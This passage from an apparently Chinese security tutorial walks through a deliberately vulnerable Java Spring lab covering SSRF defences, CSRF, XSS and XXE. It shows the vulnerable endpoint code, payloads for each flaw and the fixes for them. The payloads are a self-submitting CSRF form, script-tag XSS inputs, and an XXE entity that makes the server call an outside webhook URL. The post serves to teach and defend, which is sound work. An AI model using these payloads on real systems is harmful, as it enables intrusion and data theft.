<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/IOUtils/sec&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">IOUtils</span><span class="params">(String url)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          SecurityUtil.startSSRFHook();</span><br><span class="line">          HttpUtils.IOUtils(url);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (SSRFException | IOException e) &#123;</span><br><span class="line">          <span class="keyword">return</span> e.getMessage();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          SecurityUtil.stopSSRFHook();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;IOUtils ssrf test&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>IOUtils</code>函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">IOUtils</span><span class="params">(String url)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          IOUtils.toByteArray(URI.create(url));</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">          logger.error(e.getMessage());</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>特性&#x2F;框架</th>
<th><strong>OkHttp</strong></th>
<th><strong>Apache HttpClient 4.x</strong></th>
<th><strong>Commons HttpClient 3.x</strong></th>
<th><strong>Jsoup</strong></th>
<th><strong>IOUtils + URLConnection</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>主要定位</strong></td>
<td>现代高性能 HTTP 客户端</td>
<td>企业常用 HTTP 客户端</td>
<td>老版本 HTTP 客户端（已废弃）</td>
<td>网页抓取 + HTML 解析</td>
<td>简单流读取工具</td>
</tr>
<tr>
<td><strong>支持协议</strong></td>
<td>HTTP&#x2F;HTTPS（默认拒绝 file:&#x2F;&#x2F;）</td>
<td>HTTP&#x2F;HTTPS（默认拒绝 file:&#x2F;&#x2F;）</td>
<td>HTTP&#x2F;HTTPS（部分场景支持 file:&#x2F;&#x2F;）</td>
<td>HTTP&#x2F;HTTPS&#x2F;FILE</td>
<td>HTTP&#x2F;HTTPS&#x2F;FILE&#x2F;GOPHER 等</td>
</tr>
<tr>
<td><strong>是否跟随重定向</strong></td>
<td>✅ 默认跟随，可禁用</td>
<td>✅ 默认跟随，可禁用</td>
<td>✅ 默认跟随，可禁用</td>
<td>✅ 默认跟随</td>
<td>✅ 默认跟随</td>
</tr>
<tr>
<td><strong>连接池</strong></td>
<td>✅ 内置复用连接池</td>
<td>✅ 可配置连接池</td>
<td>❌ 无</td>
<td>❌ 无</td>
<td>❌ 每次新建连接</td>
</tr>
<tr>
<td><strong>超时设置</strong></td>
<td>✅ 支持连接&#x2F;读超时</td>
<td>✅ 支持连接&#x2F;读超时</td>
<td>❌ 配置复杂，易忽略</td>
<td>✅ 可配置超时</td>
<td>❌ 默认无限等待</td>
</tr>
<tr>
<td><strong>HTTP&#x2F;2 支持</strong></td>
<td>✅ 支持</td>
<td>❌ 不支持（需额外模块）</td>
<td>❌ 不支持</td>
<td>❌ 不支持</td>
<td>❌ 不支持</td>
</tr>
<tr>
<td><strong>API 复杂度</strong></td>
<td>简单，链式调用</td>
<td>相对复杂，配置灵活</td>
<td>老旧 API，繁琐</td>
<td>最简单</td>
<td>最原始</td>
</tr>
<tr>
<td><strong>维护情况</strong></td>
<td>活跃（Square 维护）</td>
<td>活跃（Apache 维护）</td>
<td>❌ 已停止维护</td>
<td>活跃（Jsoup 团队）</td>
<td>JDK 自带，无新特性</td>
</tr>
<tr>
<td><strong>SSRF 风险</strong></td>
<td><strong>低</strong>（默认禁止 file:&#x2F;&#x2F;）</td>
<td><strong>低</strong>（默认禁止 file:&#x2F;&#x2F;）</td>
<td>中（可能支持 file:&#x2F;&#x2F;）</td>
<td><strong>高</strong>（默认支持 file:&#x2F;&#x2F;）</td>
<td><strong>高</strong>（支持 file:&#x2F;&#x2F;、gopher:&#x2F;&#x2F;）</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>通用 HTTP 请求、API 调用、移动端</td>
<td>企业后端、复杂 HTTP 请求</td>
<td>维护遗留系统</td>
<td>爬虫、HTML 解析</td>
<td>小工具快速读取流</td>
</tr>
<tr>
<td><strong>是否推荐新项目使用</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>总结</strong></p>
<ul>
<li><strong>OkHttp</strong> 是一个现代且灵活的 HTTP 客户端，性能好，适用于大多数 HTTP 通信任务。</li>
<li><strong>HttpClient</strong> 更适合复杂的 HTTP 通信场景，有较强的功能支持，如认证、重定向等，但相对复杂，适合大型项目。</li>
<li><strong>CommonHttpClient</strong> 已经过时，主要用于老项目的兼容，不推荐在新项目中使用。</li>
<li><strong>Jsoup</strong> 适合处理 HTML 解析任务和轻量的 HTTP 请求，专注于网页抓取和数据提取。</li>
<li><strong>IOUtils</strong> 则是一个简化的工具，主要用于读取 URL 内容并转换为字节流，适合简单的小数据传输。</li>
</ul>
<p>（4）核心SSRF防护代码</p>
<p>修复代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class SocketHook &#123;</span><br><span class="line"></span><br><span class="line">    public static void startHook() throws IOException &#123;</span><br><span class="line">        SocketHookFactory.initSocket();</span><br><span class="line">        SocketHookFactory.setHook(true);</span><br><span class="line">        try&#123;</span><br><span class="line">            Socket.setSocketImplFactory(new SocketHookFactory());</span><br><span class="line">        &#125;catch (SocketException ignored)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void stopHook()&#123;</span><br><span class="line">        SocketHookFactory.setHook(false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">java复制代码123456789101112131415</span><br></pre></td></tr></table></figure>

<p><strong>功能分析</strong>：</p>
<ul>
<li><p><code>startHook()</code></p>
<p>:</p>
<ul>
<li>启动 <code>SocketHook</code>，对所有新创建的 <code>Socket</code> 应用自定义行为。核心是通过 <code>Socket.setSocketImplFactory()</code> 来设置一个新的 <code>Socket</code> 工厂。</li>
<li>可能用于在 <code>Socket</code> 连接期间监控、修改、或审查数据流量。</li>
</ul>
</li>
<li><p><code>stopHook()</code></p>
<p>:</p>
<ul>
<li>关闭 <code>SocketHook</code>，将 <code>SocketHookFactory</code> 中的钩子状态关闭，停止对新 <code>Socket</code> 实例的自定义行为。</li>
</ul>
</li>
</ul>
<p><strong>应用场景</strong>：</p>
<ul>
<li><strong>安全防护</strong>：可以用来检测、拦截或修改特定的网络连接，防止攻击（如 SSRF、RFI 等）通过不受控制的网络请求滥用服务器资源。</li>
<li><strong>网络审计</strong>：可用于监控网络流量，以记录或分析 <code>Socket</code> 通信内容。</li>
<li><strong>调试&#x2F;测试</strong>：在调试或测试环境中，使用钩子来捕获和分析网络通信行为。</li>
</ul>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>原理：</p>
<p>CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。</p>
<p>简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</p>
<p><strong>攻击流程：</strong></p>
<ol>
<li>用户在浏览器中登录了受信任的网站（如银行网站），并且拥有有效的会话。</li>
<li>攻击者创建了一个恶意网站，嵌入了向受信任网站发送请求的代码。</li>
<li>用户在登录受信任网站后，访问了攻击者的恶意网站，恶意网站在用户不知情的情况下，自动向受信任网站发送请求（如转账请求）。</li>
<li>受信任的网站无法区分该请求是用户发起的还是攻击者伪造的，因此会执行这个请求</li>
</ol>
<h4 id="1-csrf-post"><a href="#1-csrf-post" class="headerlink" title="1.&#x2F;csrf&#x2F;post"></a>1.&#x2F;csrf&#x2F;post</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">@RequestMapping(&quot;/csrf&quot;)</span><br><span class="line">public class CSRF &#123;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;/&quot;)</span><br><span class="line">    public String index() &#123;</span><br><span class="line">        return &quot;form&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @PostMapping(&quot;/post&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String post() &#123;</span><br><span class="line">        return &quot;CSRF passed.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们来看前端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot; lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;script th:src=&quot;@&#123;https://code.jquery.com/jquery-3.4.1.min.js&#125;&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field --&gt;</span><br><span class="line">    &lt;!-- &lt;form name=&quot;f&quot; th:action=&quot;@&#123;/csrf/post&#125;&quot; method=&quot;post&quot;&gt; --&gt;</span><br><span class="line">    &lt;form name=&quot;f&quot; action=&quot;/csrf/post&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;input&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; th:name=&quot;$&#123;_csrf.parameterName&#125;&quot; th:value=&quot;$&#123;_csrf.token&#125;&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>该代码存在csrf漏洞，漏洞验证poc：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;CSRF Exploit&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Simulating CSRF Attack&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form id=&quot;csrfForm&quot; action=&quot;http://127.0.0.1:8080/csrf/post&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;message&quot; value=&quot;This is a CSRF attack message&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        // 自动提交表单，执行攻击</span><br><span class="line">        document.getElementById(&#x27;csrfForm&#x27;).submit();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="csrf的防护"><a href="#csrf的防护" class="headerlink" title="csrf的防护"></a>csrf的防护</h4><ol>
<li>使用CSRF Token</li>
</ol>
<p>在每个表单或请求中，加入一个随机生成的token，并将其与服务器端的token进行对比。这个token通常存储在用户的session中，每次请求时都要携带这个token，防止外部网站伪造请求。</p>
<ul>
<li>在HTML表单中加入一个隐藏的input字段来传递CSRF token。</li>
<li>在服务器端验证请求中的token是否与存储的一致。</li>
</ul>
<ol start="2">
<li>Referer Header 检查</li>
</ol>
<p>检查请求中的<code>Referer</code> header，确保请求来源是合法的站点。尽管这一方法并不完全可靠，因为有些浏览器可能会限制或不发送<code>Referer</code>，但它可以作为额外的安全措施。</p>
<ol start="3">
<li>SameSite Cookie 属性</li>
</ol>
<p>使用<code>SameSite</code>属性设置cookies，限制跨站请求时是否可以发送cookie。<code>SameSite</code>有三个值：</p>
<ul>
<li><code>Strict</code>：完全禁止跨站请求携带cookie。</li>
<li><code>Lax</code>：只有部分跨站请求才携带cookie（例如从外部链接访问站点时）。</li>
<li><code>None</code>：允许跨站请求携带cookie，但必须设置<code>Secure</code>，即请求需要使用HTTPS。</li>
</ul>
<ol start="4">
<li>HTTP 方法限制</li>
</ol>
<p>对于敏感操作，尽量使用<code>POST</code>、<code>PUT</code>、<code>DELETE</code>等非GET方法，因为GET请求一般不带有请求体，容易被CSRF利用。并且可以通过在服务器端验证请求方法是否符合规范来增加安全性。</p>
<ol start="5">
<li>验证码（CAPTCHA）</li>
</ol>
<p>在执行重要操作（如提交表单或修改敏感信息）时，加入验证码验证，确保操作是由真实用户执行，而不是自动化脚本。</p>
<ol start="6">
<li>双重身份验证（2FA）</li>
</ol>
<p>结合身份验证措施，如短信验证码或应用生成的二次密码，在用户执行敏感操作时进一步确认其身份。</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="1-xss-reflect"><a href="#1-xss-reflect" class="headerlink" title="1.&#x2F;xss&#x2F;reflect"></a>1.&#x2F;xss&#x2F;reflect</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/reflect&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static String reflect(String xss) &#123;</span><br><span class="line">    return xss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反射型xss</p>
<p>利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xss=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251640728.png" alt="image-20250725164023603" loading="lazy"></p>
<h4 id="2-xss-stored"><a href="#2-xss-stored" class="headerlink" title="2.&#x2F;xss&#x2F;stored"></a>2.&#x2F;xss&#x2F;stored</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/stored/store&quot;)</span><br><span class="line">   @ResponseBody</span><br><span class="line">   public String store(String xss, HttpServletResponse response) &#123;</span><br><span class="line">       Cookie cookie = new Cookie(&quot;xss&quot;, xss);</span><br><span class="line">       response.addCookie(cookie);</span><br><span class="line">       return &quot;Set param into cookie&quot;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   /**</span><br><span class="line">    * Vul Code.</span><br><span class="line">    * StoredXSS Step2</span><br><span class="line">    * http://localhost:8080/xss/stored/show</span><br><span class="line">    *</span><br><span class="line">    * @param xss unescape string</span><br><span class="line">    */</span><br><span class="line">   @RequestMapping(&quot;/stored/show&quot;)</span><br><span class="line">   @ResponseBody</span><br><span class="line">   public String show(@CookieValue(&quot;xss&quot;) String xss) &#123;</span><br><span class="line">       return xss;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>存储型xss，我们先在&#x2F;stored&#x2F;store路由存入Cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xss=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251643828.png" alt="image-20250725164345723" loading="lazy"></p>
<p>然后在&#x2F;stored&#x2F;show路由攻击</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251644303.png" alt="image-20250725164425228" loading="lazy"></p>
<h4 id="xss防护"><a href="#xss防护" class="headerlink" title="xss防护"></a>xss防护</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> /**</span><br><span class="line">     * safe Code.</span><br><span class="line">     * http://localhost:8080/xss/safe</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/safe&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public static String safe(String xss) &#123;</span><br><span class="line">        return encode(xss);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static String encode(String origin) &#123;</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;amp;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&amp;lt;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&amp;gt;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;\&quot;&quot;, &quot;&amp;quot;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;&#x27;&quot;, &quot;&amp;#x27;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;/&quot;, &quot;&amp;#x2F;&quot;);</span><br><span class="line">        return origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>把需要的字符都过滤了基本就防完了xss攻击</p>
<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><h4 id="1-xxe-xmlReader-vuln"><a href="#1-xxe-xmlReader-vuln" class="headerlink" title="1.&#x2F;xxe&#x2F;xmlReader&#x2F;vuln"></a>1.&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/xmlReader/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">xmlReaderVuln</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> WebUtils.getRequestBody(request);</span><br><span class="line">        logger.info(body);</span><br><span class="line">        <span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">        xmlReader.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(body)));  <span class="comment">// parse xml</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;xmlReader xxe vuln code&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        <span class="keyword">return</span> EXCEPT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-xxe-SAXBuilder-vuln"><a href="#2-xxe-SAXBuilder-vuln" class="headerlink" title="2.&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln"></a>2.&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String SAXBuilderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXBuilder builder = new SAXBuilder();</span><br><span class="line">            // org.jdom2.Document document</span><br><span class="line">            builder.build(new InputSource(new StringReader(body)));  // cause xxe</span><br><span class="line">            return &quot;SAXBuilder xxe vuln code&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>换用SAXReader第三方库，攻击手法同上（注意请求要以http格式进行解析）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251712331.png" alt="image-20250725171230237" loading="lazy"></p>
<h4 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码"></a>修复代码</h4><p>通过<code>setFeature</code>关闭DTD和外部实体解析从而防止了xxe</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/xmlReader/sec&quot;, method = RequestMethod.POST)</span><br><span class="line">public String xmlReaderSec(HttpServletRequest request) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        String body = WebUtils.getRequestBody(request);</span><br><span class="line">        logger.info(body);</span><br><span class="line"></span><br><span class="line">        XMLReader xmlReader = XMLReaderFactory.createXMLReader();</span><br><span class="line">        // fix code start</span><br><span class="line">        xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">        xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">        xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">        //fix code end</span><br><span class="line">        xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        return EXCEPT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;xmlReader xxe security code&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-xxe-SAXReader-vuln"><a href="#3-xxe-SAXReader-vuln" class="headerlink" title="3.&#x2F;xxe&#x2F;SAXReader&#x2F;vuln"></a>3.&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String SAXReaderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXReader reader = new SAXReader();</span><br><span class="line">            // org.dom4j.Document document</span><br><span class="line">            reader.read(new InputSource(new StringReader(body))); // cause xxe</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;SAXReader xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>和前两个的payload一样但区别是这个有回显</p>
